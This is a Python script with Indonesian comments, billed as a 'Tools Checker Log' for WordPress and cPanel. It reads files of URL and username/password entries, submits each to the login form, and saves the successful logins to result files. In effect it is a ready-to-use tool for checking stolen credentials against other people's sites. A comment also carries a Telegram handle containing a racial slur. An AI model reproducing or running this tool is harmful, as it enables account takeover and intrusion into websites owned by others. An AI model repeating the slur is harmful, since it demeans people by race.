import requests

#Ini masih tahap pengembangan kalo ad bug chat telegram gw aja : @iamhateniggers

# Fungsi untuk melakukan login ke WordPress
def login_to_wordpress(url, username, password):
    login_data = {
        'log': username,
        'pwd': password
    }
    response = requests.post(url, data=login_data)
    return response

# Fungsi untuk membaca file txt dan melakukan login
def check_wordpress_logins(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            url, credentials = line.strip().split('#')
            username, password = credentials.split('@')
            response = login_to_wordpress(url, username, password)
            
            if 'Dashboard' in response.text:
                print(f'Successful login to {url}#{username}@{password}')
                with open('result.txt', 'a') as result_file:
                    result_file.write(f'Successful login to {url}#{username}@{password}\n')
            else:
                print(f'Failed login to {url}#{username}@{password}')

# Fungsi untuk melakukan login ke cPanel dengan timeout
def login_to_cpanel(url, username, password):
    login_data = {
        'user': username,
        'pass': password
    }
    try:
        response = requests.post(url, data=login_data, timeout=5)  # Timeout set to 5 seconds
        return response
    except requests.exceptions.Timeout:
        print(f'Request timeout occurred while trying to login to {url}|{username}|{password}')
        return None
    except requests.exceptions.RequestException as e:
        print(f'An error occurred: {e}')
        return None

# Fungsi untuk membaca file txt dan melakukan login ke cPanel dengan timeout
def check_cpanel_logins(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            url, username, password = line.strip().split('|')
            response = login_to_cpanel(url, username, password)
            
            if response is not None:
                if 'cPanel' in response.text:
                    print(f'Successful login to {url}|{username}|{password}')
                    with open('result-cpanel.txt', 'a') as result_file:
                        result_file.write(f'Successful login to {url}|{username}|{password}\n')
                else:
                    print(f'Failed login to {url}|{username}|{password}')
# Menu untuk pilihan Wordpress Login Checker atau cPanel Login Checker
while True:
    print('Tools Checker Log By bnzet, Silahkan Pilih menu:')
    print('1. Wordpress Login Checker')
    print('2. cPanel Login Checker')
    print('3. Keluar')
    choice = input('Masukkan pilihan (1/2/3): ')

    if choice == '1':
        filepath = input('Masukkan file path txt untuk Wordpress: ')
        check_wordpress_logins(filepath)
        print('Proses selesai, hasil login Wordpress tersimpan di result-wordpress.txt')
    elif choice == '2':
        filepath = input('Masukkan file path txt untuk cPanel: ')
        check_cpanel_logins(filepath)
        print('Proses selesai, hasil login cPanel tersimpan di result-cpanel.txt')
    elif choice == '3':
        break
    else:
        print('Pilihan tidak valid. Silakan pilih 1, 2, atau 3.')